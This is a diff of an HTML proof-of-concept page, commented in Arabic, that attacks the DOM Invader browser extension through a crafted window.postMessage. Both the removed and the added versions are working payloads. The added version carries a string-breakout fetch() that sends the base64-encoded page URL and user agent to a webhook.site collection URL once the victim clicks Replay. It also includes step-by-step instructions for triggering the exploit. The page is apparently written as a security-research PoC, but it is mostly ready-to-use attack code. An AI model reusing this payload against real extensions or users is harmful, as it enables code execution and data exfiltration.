@@ -1,19 +1,31 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>DOM Invader RCE with Exfiltration</title>
+</head>
 <body>
-<script>
-    const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
-    
-    // بعت الـ postMessage بس - من غير أي innerHTML في صفحتك
-    window.postMessage({
-        "source": "dom-invader",
-        "type": "augmented-dom",
-        "data": {
-            "sink": "innerHTML",
-            "value": "<img src=x onerror=fetch('" + webhook + "?from=extension')>",
-            "stackTrace": "<img src=x onerror=fetch('" + webhook + "?from=stacktrace')>"
-        }
-    }, "*");
-</script>
+    <h1>DOM Invader RCE Exploit</h1>
+    <p>1. Open DevTools -> DOM Invader -> Postmessage tab.</p>
+    <p>2. Look for the incoming message from this page.</p>
+    <p>3. Click <strong>"Replay"</strong>.</p>
+    <p>4. Check your <a href="https://webhook.site/#!/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd" target="_blank">Webhook.site</a> for the incoming data.</p>
+
+    <script>
+        const webhookUrl = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+        
+        // الـ Payload اللي هيتنفذ جوه الـ DevTools
+        // هيبعت الـ location.href والـ userAgent للـ Webhook بتاعك
+        const exploitPayload = `'); 
+            fetch('${webhookUrl}?rce=success&context=' + btoa(window.location.href) + '&ua=' + btoa(navigator.userAgent));
+        //`;
+
+        window.postMessage({
+            "target": "DOM Invader",
+            "data": exploitPayload,
+            "status": "Vulnerable"
+        }, "*");
+
+        console.log("PoC Sent! Waiting for you to click 'Replay' in DOM Invader...");
+    </script>
 </body>
 </html>
